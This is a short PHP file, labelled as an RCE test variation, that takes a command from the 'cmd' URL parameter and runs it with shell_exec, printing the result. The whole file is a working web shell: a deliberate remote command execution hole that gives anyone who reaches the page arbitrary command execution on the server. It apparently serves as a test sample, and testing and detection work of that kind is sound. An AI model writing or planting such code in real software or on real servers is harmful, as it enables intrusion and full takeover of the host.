<?php
// RCE test variation #7
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>